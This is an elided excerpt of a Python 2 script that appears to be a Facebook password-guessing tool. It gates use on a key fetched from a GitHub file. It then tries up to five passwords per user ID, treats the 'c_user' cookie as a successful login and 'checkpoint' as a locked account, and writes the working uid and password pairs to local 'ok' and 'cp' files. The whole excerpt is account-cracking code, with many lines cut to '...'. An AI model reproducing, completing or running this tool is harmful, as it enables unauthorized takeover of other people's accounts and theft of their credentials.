...
def main_apv():
    ...
    r1 = requests.get('https://github.com/MarkZuke-404/maximum-pro/blob/main/appro.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;91m[RAKIB-CP] ' + coc + user + ' | ' + pass1
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;97m[RAKIB-CP] ' + uid + ' | ' + pass1
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[RAKIN-OK] ' + uid + ' | ' + pass2
                    ok = open('RAKIB-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[RAKIB-CP] ' + uid + ' | ' + pass2
                    cp = open('RAKIB-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print '\x1b[1;97m[RAKIB-CP] ' + uid + ' | ' + pass3
                        cp = open('RAKIB-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;97m[RAKIB-CP] ' + uid + ' | ' + pass4
                            cp = open('RAKIB-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[RAKI -OK] ' + uid + ' | ' + pass5
                                ok = open('RAKIB-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
